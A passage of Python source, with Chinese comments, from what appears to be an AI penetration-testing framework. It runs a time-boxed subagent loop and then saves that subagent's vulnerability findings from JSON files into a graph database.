        # 超时或主 stop 触发 → 终止嵌套 loop，把控制权还给主代理。
        import threading as _th
        import time as _time
        sub_stop = _th.Event()
        _deadline = _time.monotonic() + _SUBAGENT_TIMEOUT_S

        def _sub_watchdog():
            while not sub_stop.is_set():
                if (_time.monotonic() >= _deadline
                        or (stop_event is not None and stop_event.is_set())):
                    sub_stop.set()
                    return
                _time.sleep(1.0)

        _th.Thread(target=_sub_watchdog, daemon=True).start()
        _timed_out = {"v": False}

        def _sub_status_wrap(msg: str, *, _l: str = sub_label, _cb: Callable[[str], None] | None = _parent_status) -> None:
            if _cb is not None:
                try:
                    _cb(f"↳ [{_l}] {msg}")
                except Exception:  # noqa: BLE001
                    pass

        result = run_agent_loop(
            ai_config=ctx["ai_config"],
            system_prompt=sub_system_prompt,
            user_prompt=prompt,
            tools=sub_tools,
            max_iterations=max_iterations,
            workspace_root=workspace_root,
            db_file=db_file,
            task_id=0,  # 子代理用 0：内部工具事件不发主屏 SSE（对齐 Claude Code 折叠子代理过程），
                        # 中间步骤也不落库——它是隔离临时上下文，只回传 summary 给主代理。
            stop_event=sub_stop,
            session_role=f"subagent:{desc_key}",  # 领域溯源：save_vulnerability 标记 agent_source
            hooks=sub_hooks,
            on_status=_sub_status_wrap if _parent_status is not None else None,
            steering_provider=_sub_steering,
        )
        if sub_stop.is_set() and _time.monotonic() >= _deadline:
            _timed_out["v"] = True
    finally:
        sub_stop.set()
        if progress:
            try:
                progress["end"]()
            except Exception:  # noqa: BLE001
                pass
        if _parent_status is not None:
            try:
                _parent_status(f"↳ 子代理完成: {sub_label}")
            except Exception:  # noqa: BLE001
                pass

    # 自动入库：扫描子代理的 Write 调用，解析 findings/{domain}.json 并写入图库
    # （对齐 vibe-pentest 的 findings 文件协议 — 数据不依赖主代理转写）
    ingested = 0
    try:
        import json as _json
        from graphpt.tools.graph_write_tools import _exec_save_vulnerability
        _aid = _role.split(":", 1)[1] if ":" in _role else ""
        for rec in result.tool_calls or []:
            if str(rec.get("tool_name", "")) != "Write":
                continue
            _args = rec.get("arguments") or {}
            _path = str(_args.get("path", "")).replace("\\", "/")
            if not _path.startswith("findings/") or not _path.endswith(".json"):
                continue
            _content = str(_args.get("content", "")).strip()
            try:
                _items = _json.loads(_content)
            except (TypeError, ValueError, _json.JSONDecodeError):
                continue
            if not isinstance(_items, list):
                continue
            for item in _items:
                if not isinstance(item, dict):
                    continue
                try:
                    _r = _exec_save_vulnerability({
                        "url": str(item.get("url", "")),
                        "vuln_type": str(item.get("vuln_type", "")),
                        "title": str(item.get("title", "")),
                        "severity": str(item.get("severity", "medium")),
                        "confidence": str(item.get("confidence", "likely")),
                        "detail": str(item.get("detail", "")),
                        "status": "confirmed",
                        "asset_id": _aid,
                    })
                    if _r.get("success"):
                        ingested += 1
                except Exception:  # noqa: BLE001
                    continue
    except Exception:  # noqa: BLE001
        pass

    # 三态验收：findings 文件写入 或 save_vulnerability 调用过 都算产出；
    # 两者都没有 → subagent_no_output=True，主 agent 收到后必须重新派发或自行补测
    saved_directly = 0
    for rec in result.tool_calls or []:
        if str(rec.get("tool_name", "")) == "save_vulnerability":
            saved_directly += 1
    no_output = (ingested == 0 and saved_directly == 0)

    if _timed_out["v"]:
        return {
            "success": False,
            "error": "subagent_timeout",
            "message": f"子代理 {desc_key} 超过 {_SUBAGENT_TIMEOUT_S}s 总时间盒被强制终止",
            "summary": (result.final_text or "")[:500] if result else "",
            "findings_ingested": ingested,
            "saved_directly": saved_directly,
            "depth": depth + 1,
        }

    summary = (result.final_text or "").strip() or "[子代理未产出文字结论]"
    return {
        "success": True,
        "summary": summary,
        "iterations": result.iterations,
        "tool_call_count": len(result.tool_calls),
        "findings_ingested": ingested,
        "saved_directly": saved_directly,
        "subagent_no_output": no_output,
        "depth": depth + 1,
    }





